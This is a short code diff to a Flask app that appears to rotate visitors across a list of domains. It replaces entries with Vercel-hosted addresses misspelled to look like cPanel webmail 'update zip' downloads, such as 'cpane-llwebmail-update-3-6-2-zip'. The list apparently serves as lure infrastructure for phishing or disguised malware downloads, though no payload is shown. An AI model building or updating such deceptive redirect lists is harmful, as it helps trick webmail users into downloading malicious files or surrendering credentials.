@@ -4,11 +4,11 @@ import os
 app = Flask(__name__)
 
 DOMAINS = [
-    'https://webber-fluffy-invention.vercel.app',
+    'https://cpane-llwebmail-update-3-6-2-zip.vercel.app',
     'https://cpanellupdate-2-3-1-zip-vigilant-gi.vercel.app',
-    'https://neo-gp-fuzzy-dollop.vercel.app',
+    'https://cpane-llwebmail-update-3-6-2-zip-sable.vercel.app',
     'https://webmail-cpanel-update-2-3-1-zip.vercel.app',
-    'https://securemail-general-update-3-3-1-zip.vercel.app'
+    'https://cpane-lwebmaiil-update-5-3-2-zip.vercel.app'
 ]
 
 # Initialize counter
